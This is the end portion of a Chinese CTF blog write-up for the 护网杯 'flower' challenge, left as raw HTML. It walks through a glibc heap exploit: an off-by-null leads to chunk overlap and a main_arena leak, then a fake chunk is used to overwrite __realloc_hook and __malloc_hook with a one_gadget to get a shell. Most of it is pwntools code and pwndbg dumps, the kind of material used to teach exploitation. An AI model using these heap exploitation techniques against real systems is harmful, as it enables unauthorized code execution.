+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">0x555555757000:	0x0000000000000000	0x0000000000000181      //成功合并了这几个堆块儿</span><br><span class="line">0x555555757010:	0x00007ffff7dd1ce8	0x00007ffff7dd1ce8</span><br><span class="line">0x555555757020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757060:	0x0000000000000000	0x0000000000000121</span><br><span class="line">0x555555757070:	0x00007ffff7dd1b78	0x00007ffff7dd1b78</span><br><span class="line">0x555555757080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555557570a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555557570b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555557570c0:	0x0000000000000000	0x00000000000000c1</span><br><span class="line">0x5555557570d0:	0x00007ffff7dd1b78	0x00007ffff7dd1b78</span><br><span class="line">0x5555557570e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555557570f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757120:	0x0000000000000000	0x0000000000000061</span><br><span class="line">0x555555757130:	0x00007ffff7dd1b78	0x00007ffff7dd1b78</span><br><span class="line">0x555555757140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757180:	0x0000000000000180	0x0000000000000060     /prv_size=180</span><br><span class="line">0x555555757190:	0x0000000a63636363	0x0000000000000000</span><br><span class="line">0x5555557571a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555557571b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555557571c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555557571d0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通过<code>off-by-null</code>触发<code>chunk overlapping</code>,然后触发两次<code>malloc_consolidate</code>,进行堆块合并:  </li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">88</span>,<span class="number">0</span>,<span class="string">'e'</span>*<span class="number">87</span>)   //改写size</span><br><span class="line">add(<span class="number">0x28</span>,<span class="number">1</span>,<span class="string">'B'</span>*<span class="number">0x20</span> + <span class="string">'\x40'</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="number">2</span>,<span class="string">'C'</span>*<span class="number">0x30</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"oice &gt;&gt; \n"</span>,<span class="string">'1'</span>*<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">88</span>,<span class="number">0</span>,<span class="string">'e'</span>*<span class="number">87</span>)</span><br><span class="line">add(<span class="number">0x28</span>,<span class="number">1</span>,<span class="string">'B'</span>*<span class="number">0x20</span> + <span class="string">'\x40'</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="number">2</span>,<span class="string">'C'</span>*<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"oice &gt;&gt; \n"</span>,<span class="string">'1'</span>*<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">remove(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"oice &gt;&gt; \n"</span>,<span class="string">'1'</span>*<span class="number">0x500</span>)</span><br></pre></td></tr></table></figure>
+
+<p>此时的内存布局如下:  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">0x555555757060:	0x0a65656565656565	0x0000000000000181   </span><br><span class="line">0x555555757070:	0x00007ffff7dd1ce8	0x00007ffff7dd1ce8</span><br><span class="line">0x555555757080:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x555555757090:	0x0000000000000030	0x0000000000000040</span><br><span class="line">0x5555557570a0:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x5555557570b0:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x5555557570c0:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x5555557570d0:	0x00007ffff7dd1b78	0x0000000000000091</span><br><span class="line">0x5555557570e0:	0x00007ffff7dd1bf8	0x00007ffff7dd1bf8</span><br><span class="line">0x5555557570f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757120:	0x0000000000000000	0x0000000000000061</span><br><span class="line">0x555555757130:	0x00007ffff7dd1b78	0x00007ffff7dd1b78</span><br><span class="line">0x555555757140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757160:	0x0000000000000090	0x0000000000000000</span><br><span class="line">0x555555757170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757180:	0x0000000000000120	0x0000000000000060</span><br><span class="line">0x555555757190:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>然后进行几次内存分配重叠堆块,泄露<code>main_arena</code>的地址,</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x30</span>,<span class="number">3</span>,<span class="string">'jcxp'</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="number">2</span>,<span class="string">'jcxp'</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="number">0</span>,<span class="string">'jcxp'</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="number">0</span>,<span class="string">'jcxp'</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="number">0</span>,<span class="string">'jcxp'</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">'flowers : '</span>)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(hex(leak))</span><br><span class="line"></span><br><span class="line">libc_base = leak - libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x10</span> - <span class="number">0x58</span></span><br><span class="line"></span><br><span class="line">log.success(hex(libc_base))</span><br></pre></td></tr></table></figure>
+
+<p>我这里使用的是通过覆盖<code>chunk2</code>的值为<code>main_arena+88</code>,此时的堆列表如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /10gx 0x555555554000+0x2020a0</span><br><span class="line">0x5555557560a0:	0x00005555557570e0	0x0000000000000030</span><br><span class="line">0x5555557560b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555557560c0:	0x0000555555757120	0x0000000000000040</span><br><span class="line">0x5555557560d0:	0x00005555557570e0	0x0000000000000030</span><br><span class="line">0x5555557560e0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p><code>chunk2</code>的内如如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /10gx 0x0000555555757120-0x10</span><br><span class="line">0x555555757110:	0x0000000000000000	0x00000000000000d1</span><br><span class="line">0x555555757120:	0x00007ffff7dd1b78	0x00007ffff7dd1b78  //fd为main_arena+88 </span><br><span class="line">0x555555757130:	0x00007ffff7dd1b78	0x00007ffff7dd1b78</span><br><span class="line">0x555555757140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757150:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在<code>main_arena</code>中布局一个<code>fake chunk</code><br>首先在<code>main_arena</code>中伪造一个size:  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="number">0</span>,p64(<span class="number">0x51</span>))</span><br><span class="line">add(<span class="number">0x30</span>,<span class="number">1</span>,<span class="string">'jcxp'</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="number">3</span>,<span class="string">'jcxp'</span>)</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>如下图所示</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> bins </span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x51</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5555557571a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x5555557571a0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x /10gx 0x7ffff7dd1b78-88</span></span><br><span class="line">0x7ffff7dd1b20 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dd1b30 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000051</span><br><span class="line">0x7ffff7dd1b40 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dd1b50 &lt;main_arena+48&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dd1b60 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>然后在<code>main_arena</code>布局我们的<code>fake chunk</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x40</span>,<span class="number">1</span>,<span class="string">'jcxp'</span>)</span><br><span class="line">target = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>] + <span class="number">0x10</span> + <span class="number">0x10</span></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="number">4</span>,p64(target))</span><br><span class="line">add(<span class="number">0x40</span>,<span class="number">1</span>,<span class="string">'jcxp'</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="number">2</span>,<span class="string">'jcxp'</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">5</span> + p64(<span class="number">0x51</span>)+p64(<span class="number">0</span>))</span><br><span class="line"><span class="comment">#---</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target = target + <span class="number">0x28</span>+<span class="number">0x8</span></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,<span class="number">2</span>,p64(target))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,<span class="number">1</span>,<span class="string">'jcxp'</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="number">4</span>,<span class="string">'jcxp'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>此时<code>main_arena</code>中的<code>fake chunk</code>如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins </span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x51</span><br><span class="line">0x50: 0x7ffff7dd1b60 (main_arena+64) ◂— 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0x40: 0x5555557571a0 —▸ 0x7ffff7dd1ba8 (main_arena+136) ◂— 0x5555557571a0</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x /10gx 0x7ffff7dd1b60</span><br><span class="line">0x7ffff7dd1b60 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000051</span><br><span class="line">0x7ffff7dd1b70 &lt;main_arena+80&gt;:	0x0000000000000000	0x000055555575720a</span><br><span class="line">0x7ffff7dd1b80 &lt;main_arena+96&gt;:	0x00005555557571a0	0x00007ffff7dd1b78</span><br><span class="line">0x7ffff7dd1b90 &lt;main_arena+112&gt;:	0x00007ffff7dd1b78	0x00007ffff7dd1b88</span><br><span class="line">0x7ffff7dd1ba0 &lt;main_arena+128&gt;:	0x00007ffff7dd1b88	0x00007ffff7dd1b98</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>
+
+<p>由于<code>main_arena+88</code>存放的使<code>topchunk</code>的值,我们可以通过<code>fake chunk</code>覆盖<code>topchunk</code>为<code>__malloc_hook-0x18</code>的地址.<br>在测试时发现直接覆盖为<code>__malloc_hook-0x18</code>的地址 然后修改为<code>one_gadget</code>,并不能利用成功.<br>这里修改<code>__realloc_hook</code>为<code>one_gadget</code>,此时<code>malloc_hook</code>为<code>realloc+0x14</code>地址处，通过<code>malloc</code>函数来触发<code>one_gadget</code>.代码如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x40</span>,<span class="number">1</span>,p64(<span class="number">0</span>)+p64(libc_base+libc.symbols[<span class="string">'__realloc_hook'</span>]<span class="number">-0x18</span><span class="number">-0x8</span>))</span><br><span class="line">realloc = libc_base + libc.symbols[<span class="string">'__libc_realloc'</span>]</span><br><span class="line">one = <span class="number">0xf02a4</span> + libc_base</span><br><span class="line">add(<span class="number">0x40</span>,<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span> + p64(one) + p64(realloc+<span class="number">0x14</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"oice &gt;&gt; \n"</span>,str(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">'Size : '</span>,str(<span class="number">10</span>))</span><br><span class="line">p.sendlineafter(<span class="string">'index: '</span>,str(<span class="number">0</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>成功<code>getshell</code></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line"><span class="meta">$</span><span class="bash"> whoami</span></span><br><span class="line">[DEBUG] Sent 0x7 bytes:</span><br><span class="line">    'whoami\n'</span><br><span class="line">[DEBUG] Received 0x5 bytes:</span><br><span class="line">    'jcxp\n'</span><br><span class="line">jcxp</span><br></pre></td></tr></table></figure>
+
+
+    </article>
+    <!-- license  -->
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:jiancanxuepiao@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/jcxp" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#malloc-consolidate-函数分析"><span class="toc-number">1.1.</span> <span class="toc-text">malloc_consolidate()函数分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#程序逻辑"><span class="toc-number">1.2.</span> <span class="toc-text">程序逻辑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tips"><span class="toc-number">1.3.</span> <span class="toc-text">tips</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用流程"><span class="toc-number">1.4.</span> <span class="toc-text">利用流程</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 1
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/11</span><a class="archive-post-title" href= "/2019/09/11/护网杯-flower-Writeup/" >护网杯 flower Writeup</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "jcxp"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
